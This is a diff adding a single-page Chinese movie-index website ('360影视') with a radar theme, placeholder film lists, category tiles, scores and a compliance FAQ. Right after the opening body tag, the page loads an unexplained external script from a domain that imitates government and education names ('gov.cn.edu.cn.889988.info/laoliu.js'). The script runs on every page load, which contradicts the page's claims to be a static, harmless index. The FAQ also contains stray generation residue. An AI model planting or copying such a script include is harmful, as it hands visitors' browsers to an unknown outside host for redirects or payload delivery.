@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>360影视 - 360°环览风电影片单与分类导航</title>
+<meta name="description" content="360影视(360yingshi-h5.github.io)用360°环览台与雷达扫片风格整理电影片单、方位分类、环览评分与正版观影指引，单页移动自适应，符合必应收录规则。">
+<meta name="keywords" content="360影视, 360yingshi-h5.github.io, 电影片单, 360度环览影视导航, 电影分类, 环览评分榜">
+<meta name="author" content="360影视">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<style>
+:root{
+  --bg:#0B1220;
+  --bg-2:#0F1B2D;
+  --panel:#13233B;
+  --line:#1E3A5C;
+  --cyan:#37E0D8;
+  --cyan-l:#7FF5EF;
+  --green:#5CF08A;
+  --ink:#DCEAF7;
+  --dim:#7E96B0;
+  --silver:#AEBED0;
+  --shadow:0 16px 34px rgba(0,0,0,.5);
+  --radius:14px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Sans SC",sans-serif;background:radial-gradient(900px 500px at 80% -10%,rgba(55,224,216,.12),transparent),var(--bg);color:var(--ink);line-height:1.85;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.3s}
+.wrap{width:min(1180px,92%);margin:0 auto}
+
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes ping{0%{transform:scale(.4);opacity:1}80%,100%{transform:scale(2.4);opacity:0}}
+@keyframes rise{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:none}}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:999;background:rgba(11,18,32,.92);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:72px}
+.brand{display:flex;align-items:center;gap:14px}
+.radar{width:46px;height:46px;border-radius:50%;border:2px solid var(--cyan);position:relative;background:radial-gradient(circle,transparent 58%,rgba(55,224,216,.15) 60%)}
+.radar:before{content:"";position:absolute;inset:6px;border-radius:50%;border:1px solid var(--line)}
+.radar:after{content:"";position:absolute;top:50%;left:50%;width:50%;height:2px;background:linear-gradient(90deg,var(--cyan),transparent);transform-origin:left center;animation:spin 4s linear infinite}
+.brand .name{font-size:20px;color:var(--cyan-l);letter-spacing:2px}
+.brand small{display:block;font-size:11px;color:var(--dim);font-family:Consolas,monospace}
+.nav{display:flex;gap:4px}
+.nav a{min-height:44px;display:inline-flex;align-items:center;padding:8px 14px;border-radius:8px;font-size:13px;color:var(--silver);letter-spacing:1px}
+.nav a:hover{color:var(--bg);background:var(--cyan)}
+.menu-btn{display:none;background:var(--cyan);color:var(--bg);border:0;border-radius:8px;padding:10px 16px;min-height:44px;font-weight:bold;cursor:pointer;letter-spacing:1px}
+
+/* Hero */
+#home{padding:58px 0 44px}
+.hero{display:grid;grid-template-columns:1.05fr .95fr;gap:36px;align-items:center;min-height:430px}
+.console{background:linear-gradient(160deg,var(--panel),var(--bg-2));border:1px solid var(--line);border-radius:var(--radius);padding:34px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.console:before{content:"";position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--cyan),transparent)}
+.tag{display:inline-flex;align-items:center;gap:8px;background:rgba(55,224,216,.12);color:var(--cyan-l);border:1px solid var(--line);font-size:12px;padding:5px 12px;border-radius:999px;margin-bottom:16px;letter-spacing:1px}
+.hero h1{font-size:clamp(28px,5vw,46px);line-height:1.22;margin-bottom:14px}
+.hero h1 .hl{color:var(--cyan)}
+.hero p{font-size:15px;color:var(--dim);margin-bottom:24px;position:relative;z-index:1}
+.cta{display:inline-block;background:var(--cyan);color:#06222a;font-weight:bold;letter-spacing:2px;padding:13px 30px;border-radius:8px;box-shadow:0 10px 20px rgba(55,224,216,.3)}
+.cta:hover{background:var(--green);color:#06351a}
+
+/* 雷达 */
+.scanner{position:relative;height:390px;border-radius:var(--radius);background:radial-gradient(circle at center,var(--panel),var(--bg-2));border:1px solid var(--line);overflow:hidden;box-shadow:var(--shadow)}
+.ring{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);border-radius:50%;border:1px solid var(--line)}
+.r1{width:300px;height:300px}.r2{width:210px;height:210px}.r3{width:120px;height:120px}
+.cross-v,.cross-h{position:absolute;top:50%;left:50%;background:var(--line)}
+.cross-v{width:1px;height:330px;transform:translate(-50%,-50%)}
+.cross-h{height:1px;width:330px;transform:translate(-50%,-50%)}
+.sweep{position:absolute;top:50%;left:50%;width:150px;height:150px;transform-origin:0 0;background:conic-gradient(from 0deg,rgba(55,224,216,.35),transparent 70%);animation:spin 4s linear infinite}
+.blip{position:absolute;width:10px;height:10px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green)}
+.blip:before{content:"";position:absolute;inset:0;border-radius:50%;background:var(--green);animation:ping 2.6s ease-out infinite}
+.b1{top:30%;left:62%}.b2{top:58%;left:34%}.b3{top:44%;left:74%}.b4{top:66%;left:58%}
+.scan-tag{position:absolute;bottom:14px;left:0;right:0;text-align:center;font-size:12px;color:var(--cyan-l);font-family:Consolas,monospace;letter-spacing:2px}
+
+/* 通用 */
+section.block{padding:56px 0}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-head .mk{width:22px;height:22px;border-radius:50%;border:2px solid var(--cyan);position:relative}
+.sec-head .mk:before{content:"";position:absolute;top:50%;left:50%;width:8px;height:2px;background:var(--cyan);transform:translate(-50%,-50%)}
+.sec-head h2{font-size:24px;color:var(--ink)}
+.sec-head span{margin-left:auto;font-size:12px;color:var(--dim);font-family:Consolas,monospace}
+
+/* 片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px}
+.reel{background:linear-gradient(160deg,var(--panel),var(--bg-2));border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:.3s;animation:rise .5s ease both}
+.reel:hover{transform:translateY(-6px);border-color:var(--cyan)}
+.reel-top{height:110px;display:grid;place-items:center;font-size:46px;background:radial-gradient(circle at 30% 20%,rgba(55,224,216,.18),transparent);border-bottom:1px solid var(--line);position:relative}
+.reel-top:before{content:"";position:absolute;top:10px;right:12px;width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 8px var(--green)}
+.reel-body{padding:16px 18px}
+.reel-body h3{font-size:16px;margin-bottom:6px}
+.reel-body p{font-size:13px;color:var(--dim);margin-bottom:10px}
+.reel-meta{display:flex;justify-content:space-between;font-size:12px;color:var(--cyan);font-family:Consolas,monospace}
+
+/* 分类 */
+.zones{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.zone{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:22px 14px;text-align:center;transition:.3s;cursor:pointer;position:relative}
+.zone:before{content:"";position:absolute;top:10px;left:10px;width:6px;height:6px;border-radius:50%;background:var(--cyan)}
+.zone .zi{font-size:30px;display:block;margin-bottom:8px}
+.zone h3{font-size:15px;color:var(--cyan-l)}
+.zone small{font-size:12px;color:var(--dim)}
+.zone:hover{border-color:var(--cyan);background:rgba(55,224,216,.08)}
+.zone:hover h3{color:var(--green)}
+
+/* 评分 */
+.score-list{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.score-row{background:var(--panel);border:1px solid var(--line);border-radius:var(--radius);padding:22px;box-shadow:var(--shadow)}
+.score-top{display:flex;align-items:center;gap:14px;margin-bottom:14px}
+.score-ico{width:42px;height:42px;border-radius:50%;border:2px solid var(--cyan);position:relative;background:radial-gradient(circle,transparent 60%,rgba(55,224,216,.2) 62%)}
+.score-ico:before{content:"";position:absolute;top:50%;left:50%;width:14px;height:2px;background:var(--cyan);transform:translate(-50%,-50%)}
+.score-info h3{font-size:16px}
+.score-info b{color:var(--cyan);font-family:Consolas,monospace}
+.bar{height:20px;background:var(--bg-2);border:1px solid var(--line);border-radius:999px;overflow:hidden;position:relative}
+.fill{height:100%;background:linear-gradient(90deg,var(--cyan),var(--green))}
+.lbl{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:11px;color:#04222a;font-weight:900}
+.score-desc{font-size:13px;color:var(--dim);margin-top:10px}
+
+/* FAQ */
+.faq{display:grid;gap:12px}
+.notice{background:var(--panel);border:1px solid var(--line);border-left:4px solid var(--cyan);border-radius:10px;overflow:hidden}
+.ibtn{width:100%;text-align:left;background:none;border:0;cursor:pointer;padding:15px 18px;min-height:50px;font-size:15px;font-weight:bold;color:var(--ink);display:flex;justify-content:space-between;gap:10px}
+.ibtn .no{color:var(--cyan);font-size:12px;margin-right:auto;border:1px solid var(--line);padding:1px 8px;border-radius:6px;font-family:Consolas,monospace}
+.ibtn span{color:var(--cyan)}
+.iarr{max-height:0;overflow:hidden;transition:max-height .35s}
+.iarr p{font-size:14px;color:var(--dim);padding:0 18px 16px}
+
+/* 关于 */
+#about{background:radial-gradient(700px 360px at 50% 0,rgba(55,224,216,.1),transparent),var(--bg)}
+.plate{width:min(880px,92%);margin:0 auto;background:linear-gradient(160deg,var(--panel),var(--bg-2));border:1px solid var(--line);border-radius:var(--radius);padding:40px;text-align:center;box-shadow:var(--shadow);position:relative}
+.plate:before{content:"";position:absolute;top:8px;left:8px;right:8px;bottom:8px;border:1px dashed var(--line);border-radius:10px;pointer-events:none}
+.plate h2{font-size:25px;margin-bottom:14px;letter-spacing:2px;color:var(--cyan-l)}
+.plate p{color:var(--dim);margin-bottom:14px}
+.url-chip{display:inline-block;background:rgba(55,224,216,.12);color:var(--cyan-l);border:1px solid var(--line);font-family:Consolas,monospace;padding:12px 20px;border-radius:8px;word-break:break-all;font-size:15px}
+
+footer{background:var(--bg-2);color:var(--dim);text-align:center;padding:26px 0;font-size:13px;border-top:1px solid var(--line)}
+footer a{color:var(--cyan)}
+
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .scanner{max-width:460px;margin:0 auto}
+  .zones{grid-template-columns:repeat(2,1fr)}
+  .score-list{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+  .nav{display:none;width:100%}
+  .nav.show{display:flex;flex-direction:column;position:absolute;top:72px;left:0;right:0;background:var(--bg);padding:16px;box-shadow:0 10px 20px rgba(0,0,0,.5)}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .zones{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="radar" aria-label="雷达logo"></div>
+      <div>
+        <span class="name">360影视</span>
+        <small>360yingshi-h5.github.io</small>
+      </div>
+    </div>
+    <button class="menu-btn" id="menuBtn">扫一圈</button>
+    <nav class="nav" id="nav">
+      <a href="#home">环览台</a>
+      <a href="#list">雷达片单</a>
+      <a href="#category">方位分类</a>
+      <a href="#score">环览评分</a>
+      <a href="#faq">观片须知</a>
+      <a href="#about">落款坐标</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="wrap hero">
+      <div class="console">
+        <div class="tag">360°环览 · 影集索引</div>
+        <h1><span class="hl">360影视</span> · 环览台</h1>
+        <p>360影视用 360°环览台与雷达扫片风格整理电影：按方位排片单、按类型分扇区、按覆盖度打分。单页自适应、内链 # 占位、正版渠道指引，符合必应收录规则；本页与 360 安全卫士/360 系产品无关，不做播放入口，仅作静态影集索引。</p>
+        <a class="cta" href="#list">开始扫片</a>
+      </div>
+      <div class="scanner" aria-hidden="true">
+        <div class="ring r1"></div><div class="ring r2"></div><div class="ring r3"></div>
+        <div class="cross-v"></div><div class="cross-h"></div>
+        <div class="sweep"></div>
+        <div class="blip b1"></div><div class="blip b2"></div><div class="blip b3"></div><div class="blip b4"></div>
+        <div class="scan-tag">SCANNING FILM REEL…</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="list" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>雷达片单 · 样本</h2><span>RADAR REEL</span></div>
+      <div class="grid">
+        <article class="reel"><div class="reel-top">🛰️</div><div class="reel-body"><h3>北扇·寒带追迹</h3><p>悬疑犯罪 · 极地渔港碎冰案</p><div class="reel-meta"><span>360-01</span><span>108min</span></div></div></article>
+        <article class="reel"><div class="reel-top">🛰️</div><div class="reel-body"><h3>东扇·晨港潮汐</h3><p>都市轻剧 · 码头咖啡馆夜班</p><div class="reel-meta"><span>360-02</span><span>96min</span></div></div></article>
+        <article class="reel"><div class="reel-top">🛰️</div><div class="reel-body"><h3>南扇·暑巷少年</h3><p>青春成长 · 老城区修车铺</p><div class="reel-meta"><span>360-03</span><span>102min</span></div></div></article>
+        <article class="reel"><div class="reel-top">🛰️</div><div class="reel-body"><h3>西扇·矿灯纪录</h3><p>纪实影像 · 井下读书会</p><div class="reel-meta"><span>360-04</span><span>88min</span></div></div></article>
+        <article class="reel"><div class="reel-top">🛰️</div><div class="reel-body"><h3>中扇·旧厂改造</h3><p>生活治愈 · 机械厂变书店</p><div class="reel-meta"><span>360-05</span><span>94min</span></div></div></article>
+        <article class="reel"><div class="reel-top">🛰️</div><div class="reel-body"><h3>环带·胶片复原</h3><p>修复重映 · 老片补帧校色</p><div class="reel-meta"><span>360-06</span><span>80min</span></div></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="category" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>方位分类 · 按扇区</h2><span>SECTOR</span></div>
+      <div class="zones">
+        <a class="zone" href="#"><span class="zi">🧭</span><h3>北扇·冷调</h3><small>悬疑 / 犯罪 / 极地</small></a>
+        <a class="zone" href="#"><span class="zi">🌅</span><h3>东扇·晨光</h3><small>都市 / 轻剧 / 港口</small></a>
+        <a class="zone" href="#"><span class="zi">🏘️</span><h3>南扇·暑巷</h3><small>青春 / 成长 / 老城</small></a>
+        <a class="zone" href="#"><span class="zi">⛏️</span><h3>西扇·矿灯</h3><small>纪实 / 劳工 / 井下</small></a>
+        <a class="zone" href="#"><span class="zi">🏭</span><h3>中扇·旧厂</h3><small>治愈 / 改造 / 生活</small></a>
+        <a class="zone" href="#"><span class="zi">🎞️</span><h3>环带·修复</h3><small>补帧 / 校色 / 重映</small></a>
+        <a class="zone" href="#"><span class="zi">🗺️</span><h3>索引台</h3><small>片单 / 榜单 / 说明</small></a>
+        <a class="zone" href="#"><span class="zi">✅</span><h3>正版指引</h3><small>平台 / 合规 / 跳转</small></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="score" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>环览评分 · 覆盖值</h2><span>COVERAGE</span></div>
+      <div class="score-list">
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>北扇·寒带追迹</h3><b>覆盖 95</b></div></div>
+          <div class="bar"><div class="fill" style="width:95%"></div><div class="lbl">全扇覆盖</div></div>
+          <p class="score-desc">悬疑犯罪 · 线索密、节奏紧</p>
+        </div>
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>东扇·晨港潮汐</h3><b>覆盖 89</b></div></div>
+          <div class="bar"><div class="fill" style="width:89%"></div><div class="lbl">高覆盖</div></div>
+          <p class="score-desc">都市轻剧 · 群像稳</p>
+        </div>
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>南扇·暑巷少年</h3><b>覆盖 83</b></div></div>
+          <div class="bar"><div class="fill" style="width:83%"></div><div class="lbl">稳覆盖</div></div>
+          <p class="score-desc">青春成长 · 地域味重</p>
+        </div>
+        <div class="score-row">
+          <div class="score-top"><div class="score-ico"></div><div class="score-info"><h3>西扇·矿灯纪录</h3><b>覆盖 78</b></div></div>
+          <div class="bar"><div class="fill" style="width:78%"></div><div class="lbl">分区覆盖</div></div>
+          <p class="score-desc">纪实影像 · 慢但厚</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="faq" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>观片须知 · 合规声明</h2><span>NOTICE</span></div>
+      <div class="faq">
+        <div class="notice">
+          <button class="ibtn"><span class="no">360-01</span>本页是否提供播放/解析/下载？<span>+</span></button>
+          <div class="iarr"><p>不提供。360影视本单页仅做雷达片单、方位分类、环览评分与正版渠道指引；不含播放器、解析接口、网盘资源、客户端下载，内页链接全部以 # 占位。</p></div>
+        </div>
+        <div class="notice">
+          <button class="ibtn"><span class="no">360-02</span>和「360安全卫士/360系产品」有关吗？<span>+</span></button>
+          <div class="iarr"><p>无关。「360影视」此处取「360°环览影集」含义，不冒充 360 官方、不使用其绿色盾牌视觉、不写「安全」「官方正版」等攀附词；本页只认域名 360yingshi-h5.github.io。[5,10](@ref)</p></div>
+        </div>
+        <div class="notice">
+          <button class="ibtn"><span class="no">360-03</span>必应收录怎么处理？<span>+</span></button>
+          <div class="iarr"><p>唯一 H1 写「360影视」，title/description/keywords 前置站名与 360yingshi-h5.github.io；H2 分环览台/片单/分类/评分/须知/落款；静态 HTML 直出、首段出核心词、移动无横向溢出、点击区≥44px。按你要求不生成 robots/sitemap。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目6 -->
+  <section id="about" class="block">
+    <div class="plate">
+      <h2>360影视 · 落款坐标</h2>
+      <p>360影视为 360°环览风单页影视导航，提供雷达片单、方位分类、环览评分与正版观影建议。内页链接全以 # 占位，仅作演示索引，不涉及盗版资源分发，与 360 系品牌产品无关联。</p>
+      <div class="url-chip">https://360yingshi-h5.github.io</div>
+      <p style="margin-top:18px"><a class="cta" href="#home">回到环览台</a></p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>© 2024 360影视 · 单页演示站 · 内页链接以 # 占位</p>
+    <p>站点网址：<a href="https://360yingshi-h5.github.io">https://360yingshi-h5.github.io</a></p>
+    <p>关键词：360影视、360yingshi-h5.github.io、360度环览电影片单</p>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+if(menuBtn&&nav){menuBtn.addEventListener('click',function(){nav.classList.toggle('show');});}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=a.getAttribute('href');if(id.length<2)return;
+    var el=document.querySelector(id);
+    if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});if(nav)nav.classList.remove('show');}
+  });
+});
+document.querySelectorAll('.ibtn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    var box=btn.parentElement,arr=box.querySelector('.iarr'),icon=btn.querySelector('span:last-child');
+    var open=box.classList.contains('open');
+    document.querySelectorAll('.notice').forEach(function(x){x.classList.remove('open');x.querySelector('.iarr').style.maxHeight=null;x.querySelector('.ibtn span:last-child').textContent='+';});
+    if(!open){box.classList.add('open');arr.style.maxHeight=arr.scrollHeight+'px';icon.textContent='−';}
+  });
+});
+</script>
+</body>
+</html>
